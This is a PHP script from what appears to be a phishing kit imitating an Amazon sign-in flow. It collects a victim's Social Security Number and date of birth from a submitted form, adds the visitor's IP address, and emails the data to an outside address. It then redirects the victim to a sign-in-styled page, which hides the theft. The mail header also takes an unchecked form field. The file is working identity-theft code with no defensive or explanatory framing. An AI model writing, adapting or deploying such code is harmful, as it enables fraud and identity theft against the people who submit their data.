<?php


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+Don| BESMELLAH |DJOU+------------\n";
$bilsmg .= "Social Security Number               : ".$_POST['ssn']."\n";
$bilsmg .= "|Date of Birth -----: ".$_POST['dob']."<br>\n";

$bilsmg .= "------------+Don| HAMDOULELLEH |DJOU+------------\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "administrator@us-en.info";
$bilsub = "SSN | From $ip";
$bilhead = "From:Social Security Number Address <KOMANDAN>";
$bilhead .= $_POST['bat']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="../authenticationContext=language3Den_US26marketplaceId3DATVPDKIKX0DER26assocHandle3Dusflex26pageId3Dusflex26returnTo3Dhttps253A252F252Fwww.amazon.com252F253Fref253Dnav_ya_signin.html";
header("location:$src");
?>
?>